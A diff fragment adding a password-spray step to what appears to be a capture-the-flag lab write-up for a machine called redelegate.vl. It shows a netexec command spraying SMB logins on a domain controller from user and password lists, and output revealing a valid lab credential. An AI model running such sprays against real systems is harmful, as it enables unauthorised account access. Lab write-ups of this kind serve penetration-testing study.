@@ -463,3 +463,12 @@ Administrator
 ```
 I can now use this to enumerate further
 
+# Password spray
+So i have all the passwords in a file and now a user list so ill do a password spray
+
+```python
+nxc smb dc.redelegate.vl -u users.txt -p passwords.txt --continue-on-success
+
+SMB         10.129.234.50   445    DC               [+] redelegate.vl\marie.curie:Fall2024!
+```
+
